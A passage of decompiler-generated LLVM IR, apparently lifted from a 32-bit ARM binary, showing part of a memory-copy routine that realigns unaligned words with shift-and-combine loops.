  %v8_16c98 = inttoptr i32 %v7_16c98 to i8*
  store i8 %v7_16c94, i8* %v8_16c98, align 1
  %v9_16c98 = load i32, i32* %r0.global-to-local, align 4
  %v10_16c98 = add i32 %v9_16c98, 1
  store i32 %v10_16c98, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_16dcc76 = phi i32 [ %v10_16c98, %bb146 ], [ %v7_16c98, %.thread126 ]
  %v0_16c9c = load i32, i32* %r2.global-to-local, align 4
  %v1_16c9c = load i32, i32* @ip, align 4
  %v2_16c9c = sub i32 %v0_16c9c, %v1_16c9c
  store i32 %v2_16c9c, i32* %r2.global-to-local, align 4
  %v4_16c9c = xor i32 %v1_16c9c, %v0_16c9c
  %v5_16c9c = xor i32 %v2_16c9c, %v0_16c9c
  %v6_16c9c = and i32 %v5_16c9c, %v4_16c9c
  %v7_16c9c = icmp slt i32 %v6_16c9c, 0
  store i1 %v7_16c9c, i1* %cpsr_v.global-to-local, align 1
  %v8_16c9c = icmp slt i32 %v2_16c9c, 0
  store i1 %v8_16c9c, i1* %cpsr_n.global-to-local, align 1
  %v9_16c9c = icmp eq i32 %v0_16c9c, %v1_16c9c
  store i1 %v9_16c9c, i1* %cpsr_z.global-to-local, align 1
  %v2_16ca0 = xor i1 %v8_16c9c, %v7_16c9c
  br i1 %v2_16ca0, label %bb140, label %dec_label_pc_16ca4

dec_label_pc_16ca4:                               ; preds = %.thread127
  %v0_16ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ca4 = urem i32 %v0_16ca4, 4
  store i32 %v1_16ca4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ca4 = icmp eq i32 %v1_16ca4, 0
  store i1 %v2_16ca4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_16ca4 to i2
  br i1 %v2_16ca4, label %dec_label_pc_16bd8, label %dec_label_pc_16cac

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16bd0, %dec_label_pc_16ca4
  %v0_16dcc75 = phi i32 [ %v1_16bb0, %dec_label_pc_16bd0 ], [ %v0_16dcc76, %dec_label_pc_16ca4 ]
  %v0_16d34 = phi i32 [ %v2_16bc0, %dec_label_pc_16bd0 ], [ %v2_16c9c, %dec_label_pc_16ca4 ]
  %v0_16cb4.off0 = phi i2 [ %extract.t, %dec_label_pc_16bd0 ], [ %extract.t130, %dec_label_pc_16ca4 ]
  %v0_16cac = phi i32 [ %v0_16bb0, %dec_label_pc_16bd0 ], [ %v0_16ca4, %dec_label_pc_16ca4 ]
  %v1_16cac = and i32 %v0_16cac, -4
  store i32 %v1_16cac, i32* %r1.global-to-local, align 4
  %v1_16cb0 = inttoptr i32 %v1_16cac to i32*
  %v2_16cb0 = load i32, i32* %v1_16cb0, align 4
  store i32 %v2_16cb0, i32* %lr.global-to-local, align 4
  %v4_16cb0 = add i32 %v1_16cac, 4
  store i32 %v4_16cb0, i32* %r1.global-to-local, align 4
  %v1_16d2c = add i32 %v0_16d34, -12
  %v3_16d2c = sub i32 11, %v0_16d34
  %v4_16d2c = and i32 %v3_16d2c, %v0_16d34
  %v5_16d2c = icmp slt i32 %v4_16d2c, 0
  store i1 %v5_16d2c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d2c = icmp slt i32 %v1_16d2c, 0
  store i1 %v6_16d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d2c = icmp eq i32 %v0_16d34, 12
  store i1 %v7_16d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d30 = xor i1 %v6_16d2c, %v5_16d2c
  switch i2 %v0_16cb4.off0, label %dec_label_pc_16cc0 [
    i2 -1, label %dec_label_pc_16d98
    i2 -2, label %dec_label_pc_16d2c
  ]

dec_label_pc_16cc0:                               ; preds = %dec_label_pc_16cac
  br i1 %v2_16d30, label %dec_label_pc_16d0c, label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16cc0
  store i32 %v1_16d2c, i32* %r2.global-to-local, align 4
  %v3_16ccc = load i32, i32* @r4, align 4
  store i32 %v3_16ccc, i32* %stack_var_-16, align 4
  %v6_16ccc = load i32, i32* @r5, align 4
  store i32 %v6_16ccc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge, %dec_label_pc_16cc8
  %v0_16cf4 = phi i32 [ %v12_16cf4, %dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge ], [ %v0_16dcc75, %dec_label_pc_16cc8 ]
  %v0_16cd4 = phi i32 [ %v0_16cd4.pre, %dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge ], [ %v4_16cb0, %dec_label_pc_16cc8 ]
  %v0_16cd0 = phi i32 [ %v0_16cd0.pre, %dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge ], [ %v2_16cb0, %dec_label_pc_16cc8 ]
  %v3_16cd0 = udiv i32 %v0_16cd0, 256
  %v1_16cd4 = inttoptr i32 %v0_16cd4 to i32*
  %v2_16cd4 = load i32, i32* %v1_16cd4, align 4
  store i32 %v2_16cd4, i32* %r4.global-to-local, align 4
  %v3_16cd4 = add i32 %v0_16cd4, 4
  %v4_16cd4 = inttoptr i32 %v3_16cd4 to i32*
  %v5_16cd4 = load i32, i32* %v4_16cd4, align 4
  store i32 %v5_16cd4, i32* %r5.global-to-local, align 4
  %v6_16cd4 = add i32 %v0_16cd4, 8
  %v7_16cd4 = inttoptr i32 %v6_16cd4 to i32*
  %v8_16cd4 = load i32, i32* %v7_16cd4, align 4
  store i32 %v8_16cd4, i32* %ip.global-to-local, align 4
  %v9_16cd4 = add i32 %v0_16cd4, 12
  %v10_16cd4 = inttoptr i32 %v9_16cd4 to i32*
  %v11_16cd4 = load i32, i32* %v10_16cd4, align 4
  store i32 %v11_16cd4, i32* %lr.global-to-local, align 4
  %v12_16cd4 = add i32 %v0_16cd4, 16
  store i32 %v12_16cd4, i32* %r1.global-to-local, align 4
  %v4_16cd8 = mul i32 %v2_16cd4, 16777216
  %v5_16cd8 = or i32 %v4_16cd8, %v3_16cd0
  store i32 %v5_16cd8, i32* @r3, align 4
  %v3_16cdc = udiv i32 %v2_16cd4, 256
  %v4_16ce0 = mul i32 %v5_16cd4, 16777216
  %v5_16ce0 = or i32 %v4_16ce0, %v3_16cdc
  store i32 %v5_16ce0, i32* %r4.global-to-local, align 4
  %v3_16ce4 = udiv i32 %v5_16cd4, 256
  %v4_16ce8 = mul i32 %v8_16cd4, 16777216
  %v5_16ce8 = or i32 %v4_16ce8, %v3_16ce4
  store i32 %v5_16ce8, i32* %r5.global-to-local, align 4
  %v3_16cec = udiv i32 %v8_16cd4, 256
  %v4_16cf0 = mul i32 %v11_16cd4, 16777216
  %v5_16cf0 = or i32 %v4_16cf0, %v3_16cec
  store i32 %v5_16cf0, i32* @ip, align 4
  %v1_16cf4 = inttoptr i32 %v0_16cf4 to i32*
  store i32 %v5_16cd8, i32* %v1_16cf4, align 4
  %v3_16cf4 = add i32 %v0_16cf4, 4
  %v4_16cf4 = inttoptr i32 %v3_16cf4 to i32*
  %v5_16cf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16cf4, i32* %v4_16cf4, align 4
  %v6_16cf4 = add i32 %v0_16cf4, 8
  %v7_16cf4 = inttoptr i32 %v6_16cf4 to i32*
  %v8_16cf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16cf4, i32* %v7_16cf4, align 4
  %v9_16cf4 = add i32 %v0_16cf4, 12
  %v10_16cf4 = inttoptr i32 %v9_16cf4 to i32*
  %v11_16cf4 = load i32, i32* @ip, align 4
  store i32 %v11_16cf4, i32* %v10_16cf4, align 4
  %v12_16cf4 = add i32 %v0_16cf4, 16
  store i32 %v12_16cf4, i32* %r0.global-to-local, align 4
  %v0_16cf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16cf8 = add i32 %v0_16cf8, -16
  store i32 %v1_16cf8, i32* %r2.global-to-local, align 4
  %v3_16cf8 = sub i32 15, %v0_16cf8
  %v4_16cf8 = and i32 %v3_16cf8, %v0_16cf8
  %v5_16cf8 = icmp slt i32 %v4_16cf8, 0
  %v6_16cf8 = icmp slt i32 %v1_16cf8, 0
  %v2_16cfc = xor i1 %v6_16cf8, %v5_16cf8
  br i1 %v2_16cfc, label %dec_label_pc_16d00, label %dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge

dec_label_pc_16cd0.dec_label_pc_16cd0_crit_edge:  ; preds = %dec_label_pc_16cd0
  %v0_16cd0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16cd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16cd0

dec_label_pc_16d00:                               ; preds = %dec_label_pc_16cd0
  %v2_16d00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d00, i32* @r4, align 4
  %v5_16d00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d00, i32* @r5, align 4
  %v1_16d04 = add i32 %v0_16cf8, -4
  store i32 %v1_16d04, i32* %r2.global-to-local, align 4
  %v3_16d04 = add i32 %v0_16cf8, 2147483632
  %v4_16d04 = and i32 %v1_16d04, %v3_16d04
  %v5_16d04 = icmp slt i32 %v4_16d04, 0
  store i1 %v5_16d04, i1* %cpsr_v.global-to-local, align 1
  %v6_16d04 = icmp slt i32 %v1_16d04, 0
  store i1 %v6_16d04, i1* %cpsr_n.global-to-local, align 1
  %v7_16d04 = icmp eq i32 %v1_16d04, 0
  store i1 %v7_16d04, i1* %cpsr_z.global-to-local, align 1
  %v2_16d08 = xor i1 %v6_16d04, %v5_16d04
  br i1 %v2_16d08, label %dec_label_pc_16d24, label %dec_label_pc_16d0c

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16d00, %dec_label_pc_16cc0, %dec_label_pc_16d0c
  %v1_16d18 = phi i32 [ %v4_16d18, %dec_label_pc_16d0c ], [ %v12_16cf4, %dec_label_pc_16d00 ], [ %v0_16dcc75, %dec_label_pc_16cc0 ]
  %v0_16d0c = load i32, i32* %lr.global-to-local, align 4
  %v3_16d0c = udiv i32 %v0_16d0c, 256
  store i32 %v3_16d0c, i32* %ip.global-to-local, align 4
  %v0_16d10 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d10 = inttoptr i32 %v0_16d10 to i32*
  %v2_16d10 = load i32, i32* %v1_16d10, align 4
  store i32 %v2_16d10, i32* %lr.global-to-local, align 4
  %v4_16d10 = add i32 %v0_16d10, 4
  store i32 %v4_16d10, i32* %r1.global-to-local, align 4
  %v4_16d14 = mul i32 %v2_16d10, 16777216
  %v5_16d14 = or i32 %v4_16d14, %v3_16d0c
  store i32 %v5_16d14, i32* @ip, align 4
  %v2_16d18 = inttoptr i32 %v1_16d18 to i32*
  store i32 %v5_16d14, i32* %v2_16d18, align 4
  %v3_16d18 = load i32, i32* %r0.global-to-local, align 4
  %v4_16d18 = add i32 %v3_16d18, 4
  store i32 %v4_16d18, i32* %r0.global-to-local, align 4
  %v0_16d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16d1c = add i32 %v0_16d1c, -4
  store i32 %v1_16d1c, i32* %r2.global-to-local, align 4
  %v3_16d1c = sub i32 3, %v0_16d1c
  %v4_16d1c = and i32 %v3_16d1c, %v0_16d1c
  %v5_16d1c = icmp slt i32 %v4_16d1c, 0
  %v6_16d1c = icmp slt i32 %v1_16d1c, 0
  %v2_16d20 = xor i1 %v6_16d1c, %v5_16d1c
  br i1 %v2_16d20, label %dec_label_pc_16d24.loopexit, label %dec_label_pc_16d0c

dec_label_pc_16d24.loopexit:                      ; preds = %dec_label_pc_16d0c
  %v7_16d1c = icmp eq i32 %v0_16d1c, 4
  store i1 %v5_16d1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d1c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d1c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d24

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d24.loopexit, %dec_label_pc_16d00
  %v0_16c4c58 = phi i32 [ %v1_16d1c, %dec_label_pc_16d24.loopexit ], [ %v1_16d04, %dec_label_pc_16d00 ]
  %v0_16d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d24 = add i32 %v0_16d24, -3
  store i32 %v1_16d24, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16cac
  br i1 %v2_16d30, label %dec_label_pc_16d78, label %dec_label_pc_16d34

dec_label_pc_16d34:                               ; preds = %dec_label_pc_16d2c
  store i32 %v1_16d2c, i32* %r2.global-to-local, align 4
  %v3_16d38 = load i32, i32* @r4, align 4
  store i32 %v3_16d38, i32* %stack_var_-16, align 4
  %v6_16d38 = load i32, i32* @r5, align 4
  store i32 %v6_16d38, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16d3c

dec_label_pc_16d3c:                               ; preds = %dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge, %dec_label_pc_16d34
  %v0_16d60 = phi i32 [ %v12_16d60, %dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge ], [ %v0_16dcc75, %dec_label_pc_16d34 ]
  %v0_16d40 = phi i32 [ %v0_16d40.pre, %dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge ], [ %v4_16cb0, %dec_label_pc_16d34 ]
  %v0_16d3c = phi i32 [ %v0_16d3c.pre, %dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge ], [ %v2_16cb0, %dec_label_pc_16d34 ]
  %v3_16d3c = udiv i32 %v0_16d3c, 65536
  %v1_16d40 = inttoptr i32 %v0_16d40 to i32*
  %v2_16d40 = load i32, i32* %v1_16d40, align 4
  store i32 %v2_16d40, i32* %r4.global-to-local, align 4
  %v3_16d40 = add i32 %v0_16d40, 4
  %v4_16d40 = inttoptr i32 %v3_16d40 to i32*
  %v5_16d40 = load i32, i32* %v4_16d40, align 4
  store i32 %v5_16d40, i32* %r5.global-to-local, align 4
  %v6_16d40 = add i32 %v0_16d40, 8
  %v7_16d40 = inttoptr i32 %v6_16d40 to i32*
  %v8_16d40 = load i32, i32* %v7_16d40, align 4
  store i32 %v8_16d40, i32* %ip.global-to-local, align 4
  %v9_16d40 = add i32 %v0_16d40, 12
  %v10_16d40 = inttoptr i32 %v9_16d40 to i32*
  %v11_16d40 = load i32, i32* %v10_16d40, align 4
  store i32 %v11_16d40, i32* %lr.global-to-local, align 4
  %v12_16d40 = add i32 %v0_16d40, 16
  store i32 %v12_16d40, i32* %r1.global-to-local, align 4
  %v4_16d44 = mul i32 %v2_16d40, 65536
  %v5_16d44 = or i32 %v4_16d44, %v3_16d3c
  store i32 %v5_16d44, i32* @r3, align 4
  %v3_16d48 = udiv i32 %v2_16d40, 65536
  %v4_16d4c = mul i32 %v5_16d40, 65536
  %v5_16d4c = or i32 %v4_16d4c, %v3_16d48
  store i32 %v5_16d4c, i32* %r4.global-to-local, align 4
  %v3_16d50 = udiv i32 %v5_16d40, 65536
  %v4_16d54 = mul i32 %v8_16d40, 65536
  %v5_16d54 = or i32 %v4_16d54, %v3_16d50
  store i32 %v5_16d54, i32* %r5.global-to-local, align 4
  %v3_16d58 = udiv i32 %v8_16d40, 65536
  %v4_16d5c = mul i32 %v11_16d40, 65536
  %v5_16d5c = or i32 %v4_16d5c, %v3_16d58
  store i32 %v5_16d5c, i32* @ip, align 4
  %v1_16d60 = inttoptr i32 %v0_16d60 to i32*
  store i32 %v5_16d44, i32* %v1_16d60, align 4
  %v3_16d60 = add i32 %v0_16d60, 4
  %v4_16d60 = inttoptr i32 %v3_16d60 to i32*
  %v5_16d60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d60, i32* %v4_16d60, align 4
  %v6_16d60 = add i32 %v0_16d60, 8
  %v7_16d60 = inttoptr i32 %v6_16d60 to i32*
  %v8_16d60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d60, i32* %v7_16d60, align 4
  %v9_16d60 = add i32 %v0_16d60, 12
  %v10_16d60 = inttoptr i32 %v9_16d60 to i32*
  %v11_16d60 = load i32, i32* @ip, align 4
  store i32 %v11_16d60, i32* %v10_16d60, align 4
  %v12_16d60 = add i32 %v0_16d60, 16
  store i32 %v12_16d60, i32* %r0.global-to-local, align 4
  %v0_16d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d64 = add i32 %v0_16d64, -16
  store i32 %v1_16d64, i32* %r2.global-to-local, align 4
  %v3_16d64 = sub i32 15, %v0_16d64
  %v4_16d64 = and i32 %v3_16d64, %v0_16d64
  %v5_16d64 = icmp slt i32 %v4_16d64, 0
  %v6_16d64 = icmp slt i32 %v1_16d64, 0
  %v2_16d68 = xor i1 %v6_16d64, %v5_16d64
  br i1 %v2_16d68, label %dec_label_pc_16d6c, label %dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge

dec_label_pc_16d3c.dec_label_pc_16d3c_crit_edge:  ; preds = %dec_label_pc_16d3c
  %v0_16d3c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16d40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d3c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d3c
  %v2_16d6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d6c, i32* @r4, align 4
  %v5_16d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d6c, i32* @r5, align 4
  %v1_16d70 = add i32 %v0_16d64, -4
  store i32 %v1_16d70, i32* %r2.global-to-local, align 4
  %v3_16d70 = add i32 %v0_16d64, 2147483632
  %v4_16d70 = and i32 %v1_16d70, %v3_16d70
  %v5_16d70 = icmp slt i32 %v4_16d70, 0
  store i1 %v5_16d70, i1* %cpsr_v.global-to-local, align 1
  %v6_16d70 = icmp slt i32 %v1_16d70, 0
  store i1 %v6_16d70, i1* %cpsr_n.global-to-local, align 1
  %v7_16d70 = icmp eq i32 %v1_16d70, 0
  store i1 %v7_16d70, i1* %cpsr_z.global-to-local, align 1
  %v2_16d74 = xor i1 %v6_16d70, %v5_16d70
  br i1 %v2_16d74, label %dec_label_pc_16d90, label %dec_label_pc_16d78

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16d6c, %dec_label_pc_16d2c, %dec_label_pc_16d78
  %v1_16d84 = phi i32 [ %v4_16d84, %dec_label_pc_16d78 ], [ %v12_16d60, %dec_label_pc_16d6c ], [ %v0_16dcc75, %dec_label_pc_16d2c ]
  %v0_16d78 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d78 = udiv i32 %v0_16d78, 65536
  store i32 %v3_16d78, i32* %ip.global-to-local, align 4
  %v0_16d7c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d7c = inttoptr i32 %v0_16d7c to i32*
  %v2_16d7c = load i32, i32* %v1_16d7c, align 4
  store i32 %v2_16d7c, i32* %lr.global-to-local, align 4
  %v4_16d7c = add i32 %v0_16d7c, 4
  store i32 %v4_16d7c, i32* %r1.global-to-local, align 4
  %v4_16d80 = mul i32 %v2_16d7c, 65536
  %v5_16d80 = or i32 %v4_16d80, %v3_16d78
  store i32 %v5_16d80, i32* @ip, align 4
  %v2_16d84 = inttoptr i32 %v1_16d84 to i32*
  store i32 %v5_16d80, i32* %v2_16d84, align 4
  %v3_16d84 = load i32, i32* %r0.global-to-local, align 4
  %v4_16d84 = add i32 %v3_16d84, 4
  store i32 %v4_16d84, i32* %r0.global-to-local, align 4
  %v0_16d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d88 = add i32 %v0_16d88, -4
  store i32 %v1_16d88, i32* %r2.global-to-local, align 4
  %v3_16d88 = sub i32 3, %v0_16d88
  %v4_16d88 = and i32 %v3_16d88, %v0_16d88
  %v5_16d88 = icmp slt i32 %v4_16d88, 0
  %v6_16d88 = icmp slt i32 %v1_16d88, 0
  %v2_16d8c = xor i1 %v6_16d88, %v5_16d88
  br i1 %v2_16d8c, label %dec_label_pc_16d90.loopexit, label %dec_label_pc_16d78

dec_label_pc_16d90.loopexit:                      ; preds = %dec_label_pc_16d78
  %v7_16d88 = icmp eq i32 %v0_16d88, 4
  store i1 %v5_16d88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d88, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d90

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d90.loopexit, %dec_label_pc_16d6c
  %v0_16c4c59 = phi i32 [ %v1_16d88, %dec_label_pc_16d90.loopexit ], [ %v1_16d70, %dec_label_pc_16d6c ]
  %v0_16d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d90 = add i32 %v0_16d90, -2
  store i32 %v1_16d90, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16cac
  br i1 %v2_16d30, label %dec_label_pc_16de4, label %dec_label_pc_16da0

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d98
  store i32 %v1_16d2c, i32* %r2.global-to-local, align 4
  %v3_16da4 = load i32, i32* @r4, align 4
  store i32 %v3_16da4, i32* %stack_var_-16, align 4
  %v6_16da4 = load i32, i32* @r5, align 4
  store i32 %v6_16da4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16da8.dec_label_pc_16da8_crit_edge, %dec_label_pc_16da0
  %v0_16dcc = phi i32 [ %v12_16dcc, %dec_label_pc_16da8.dec_label_pc_16da8_crit_edge ], [ %v0_16dcc75, %dec_label_pc_16da0 ]
  %v0_16dac = phi i32 [ %v0_16dac.pre, %dec_label_pc_16da8.dec_label_pc_16da8_crit_edge ], [ %v4_16cb0, %dec_label_pc_16da0 ]
  %v0_16da8 = phi i32 [ %v0_16da8.pre, %dec_label_pc_16da8.dec_label_pc_16da8_crit_edge ], [ %v2_16cb0, %dec_label_pc_16da0 ]
  %v3_16da8 = udiv i32 %v0_16da8, 16777216
  %v1_16dac = inttoptr i32 %v0_16dac to i32*
  %v2_16dac = load i32, i32* %v1_16dac, align 4
  store i32 %v2_16dac, i32* %r4.global-to-local, align 4
  %v3_16dac = add i32 %v0_16dac, 4
  %v4_16dac = inttoptr i32 %v3_16dac to i32*
  %v5_16dac = load i32, i32* %v4_16dac, align 4
  store i32 %v5_16dac, i32* %r5.global-to-local, align 4
  %v6_16dac = add i32 %v0_16dac, 8
  %v7_16dac = inttoptr i32 %v6_16dac to i32*
  %v8_16dac = load i32, i32* %v7_16dac, align 4
  store i32 %v8_16dac, i32* %ip.global-to-local, align 4
  %v9_16dac = add i32 %v0_16dac, 12
  %v10_16dac = inttoptr i32 %v9_16dac to i32*
  %v11_16dac = load i32, i32* %v10_16dac, align 4
  store i32 %v11_16dac, i32* %lr.global-to-local, align 4
  %v12_16dac = add i32 %v0_16dac, 16
  store i32 %v12_16dac, i32* %r1.global-to-local, align 4
  %v4_16db0 = mul i32 %v2_16dac, 256
  %v5_16db0 = or i32 %v4_16db0, %v3_16da8
  store i32 %v5_16db0, i32* @r3, align 4
  %v3_16db4 = udiv i32 %v2_16dac, 16777216
  %v4_16db8 = mul i32 %v5_16dac, 256
  %v5_16db8 = or i32 %v4_16db8, %v3_16db4
  store i32 %v5_16db8, i32* %r4.global-to-local, align 4
  %v3_16dbc = udiv i32 %v5_16dac, 16777216
  %v4_16dc0 = mul i32 %v8_16dac, 256
  %v5_16dc0 = or i32 %v4_16dc0, %v3_16dbc
  store i32 %v5_16dc0, i32* %r5.global-to-local, align 4
  %v3_16dc4 = udiv i32 %v8_16dac, 16777216
  %v4_16dc8 = mul i32 %v11_16dac, 256
  %v5_16dc8 = or i32 %v4_16dc8, %v3_16dc4
  store i32 %v5_16dc8, i32* @ip, align 4
  %v1_16dcc = inttoptr i32 %v0_16dcc to i32*
  store i32 %v5_16db0, i32* %v1_16dcc, align 4
  %v3_16dcc = add i32 %v0_16dcc, 4
  %v4_16dcc = inttoptr i32 %v3_16dcc to i32*
  %v5_16dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16dcc, i32* %v4_16dcc, align 4
  %v6_16dcc = add i32 %v0_16dcc, 8
  %v7_16dcc = inttoptr i32 %v6_16dcc to i32*
  %v8_16dcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16dcc, i32* %v7_16dcc, align 4
  %v9_16dcc = add i32 %v0_16dcc, 12
  %v10_16dcc = inttoptr i32 %v9_16dcc to i32*
  %v11_16dcc = load i32, i32* @ip, align 4
  store i32 %v11_16dcc, i32* %v10_16dcc, align 4
  %v12_16dcc = add i32 %v0_16dcc, 16
  store i32 %v12_16dcc, i32* %r0.global-to-local, align 4
  %v0_16dd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16dd0 = add i32 %v0_16dd0, -16
  store i32 %v1_16dd0, i32* %r2.global-to-local, align 4
  %v3_16dd0 = sub i32 15, %v0_16dd0
  %v4_16dd0 = and i32 %v3_16dd0, %v0_16dd0
  %v5_16dd0 = icmp slt i32 %v4_16dd0, 0
  %v6_16dd0 = icmp slt i32 %v1_16dd0, 0
  %v2_16dd4 = xor i1 %v6_16dd0, %v5_16dd0
  br i1 %v2_16dd4, label %dec_label_pc_16dd8, label %dec_label_pc_16da8.dec_label_pc_16da8_crit_edge

dec_label_pc_16da8.dec_label_pc_16da8_crit_edge:  ; preds = %dec_label_pc_16da8
  %v0_16da8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16dac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16da8
  %v2_16dd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16dd8, i32* @r4, align 4
  %v5_16dd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16dd8, i32* @r5, align 4
  %v1_16ddc = add i32 %v0_16dd0, -4
  store i32 %v1_16ddc, i32* %r2.global-to-local, align 4
  %v3_16ddc = add i32 %v0_16dd0, 2147483632
  %v4_16ddc = and i32 %v1_16ddc, %v3_16ddc
  %v5_16ddc = icmp slt i32 %v4_16ddc, 0
  store i1 %v5_16ddc, i1* %cpsr_v.global-to-local, align 1
  %v6_16ddc = icmp slt i32 %v1_16ddc, 0
  store i1 %v6_16ddc, i1* %cpsr_n.global-to-local, align 1
  %v7_16ddc = icmp eq i32 %v1_16ddc, 0
  store i1 %v7_16ddc, i1* %cpsr_z.global-to-local, align 1
  %v2_16de0 = xor i1 %v6_16ddc, %v5_16ddc
  br i1 %v2_16de0, label %dec_label_pc_16dfc, label %dec_label_pc_16de4

dec_label_pc_16de4:                               ; preds = %dec_label_pc_16dd8, %dec_label_pc_16d98, %dec_label_pc_16de4
  %v1_16df0 = phi i32 [ %v4_16df0, %dec_label_pc_16de4 ], [ %v12_16dcc, %dec_label_pc_16dd8 ], [ %v0_16dcc75, %dec_label_pc_16d98 ]
  %v0_16de4 = load i32, i32* %lr.global-to-local, align 4
  %v3_16de4 = udiv i32 %v0_16de4, 16777216
  store i32 %v3_16de4, i32* %ip.global-to-local, align 4
  %v0_16de8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16de8 = inttoptr i32 %v0_16de8 to i32*
  %v2_16de8 = load i32, i32* %v1_16de8, align 4
  store i32 %v2_16de8, i32* %lr.global-to-local, align 4
  %v4_16de8 = add i32 %v0_16de8, 4
  store i32 %v4_16de8, i32* %r1.global-to-local, align 4
  %v4_16dec = mul i32 %v2_16de8, 256
  %v5_16dec = or i32 %v4_16dec, %v3_16de4
  store i32 %v5_16dec, i32* @ip, align 4
  %v2_16df0 = inttoptr i32 %v1_16df0 to i32*
  store i32 %v5_16dec, i32* %v2_16df0, align 4
  %v3_16df0 = load i32, i32* %r0.global-to-local, align 4
  %v4_16df0 = add i32 %v3_16df0, 4
  store i32 %v4_16df0, i32* %r0.global-to-local, align 4
  %v0_16df4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16df4 = add i32 %v0_16df4, -4
  store i32 %v1_16df4, i32* %r2.global-to-local, align 4
  %v3_16df4 = sub i32 3, %v0_16df4
  %v4_16df4 = and i32 %v3_16df4, %v0_16df4
  %v5_16df4 = icmp slt i32 %v4_16df4, 0
  %v6_16df4 = icmp slt i32 %v1_16df4, 0
  %v2_16df8 = xor i1 %v6_16df4, %v5_16df4
  br i1 %v2_16df8, label %dec_label_pc_16dfc.loopexit, label %dec_label_pc_16de4

dec_label_pc_16dfc.loopexit:                      ; preds = %dec_label_pc_16de4
  %v7_16df4 = icmp eq i32 %v0_16df4, 4
  store i1 %v5_16df4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16df4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16df4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16dfc

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16dfc.loopexit, %dec_label_pc_16dd8
  %v0_16c4c60 = phi i32 [ %v1_16df4, %dec_label_pc_16dfc.loopexit ], [ %v1_16ddc, %dec_label_pc_16dd8 ]
  %v0_16dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_16dfc = add i32 %v0_16dfc, -1
  store i32 %v1_16dfc, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16e04:                               ; preds = %entry
  %v1_16e04 = load i32, i32* @r2, align 4
  %v2_16e04 = add i32 %v1_16e04, %v0_16bb0
  store i32 %v2_16e04, i32* %r1.global-to-local, align 4
  %v2_16e08 = add i32 %v1_16e04, %v1_16bb0
